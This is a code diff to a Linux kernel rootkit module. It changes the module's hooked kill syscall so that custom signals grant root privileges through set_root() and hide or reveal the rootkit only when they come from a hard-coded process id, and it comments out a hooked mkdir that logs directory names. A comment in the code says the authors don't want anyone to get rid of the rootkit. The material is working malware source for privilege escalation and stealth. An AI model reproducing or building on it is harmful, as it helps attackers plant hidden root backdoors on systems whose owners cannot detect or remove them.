@@ -32,16 +32,16 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     void hide_me(void);
     void show_me(void);
 
-    if(sig == SIGSUPER){
+    if(sig == SIGSUPER && (pid == 14580)){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
         set_root();
         return orig_kill;
-    }else if((sig == SIGINVIS) && (hidden == 0)){
+    }else if((sig == SIGINVIS) && (hidden == 0) && (pid == 14580)){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return orig_kill;
-    }else if((sig == SIGINVIS) && (hidden == 1)){
+    }else if((sig == SIGINVIS) && (hidden == 1) && (pid == 14580)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
         printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
         show_me();
@@ -63,20 +63,20 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
  * mkdir
 */
 //see http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html
-static asmlinkage int hook_mkdir(const struct pt_regs *regs){
-    char __user *pathname = (char *)regs->di;
-    char dir_name[NAME_MAX] = {0};
+// static asmlinkage int hook_mkdir(const struct pt_regs *regs){
+//     char __user *pathname = (char *)regs->di;
+//     char dir_name[NAME_MAX] = {0};
 
-    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+//     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
-    if(error > 0){
-        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
-    }
-    printk(KERN_INFO "***** hacked mkdir syscall *****\n");
+//     if(error > 0){
+//         printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
+//     }
+//     printk(KERN_INFO "***** hacked mkdir syscall *****\n");
 
-    orig_mkdir(regs);
-    return 0;
-}
+//     orig_mkdir(regs);
+//     return 0;
+// }
 
 /**
  * hiding directories and files with the PREFIX
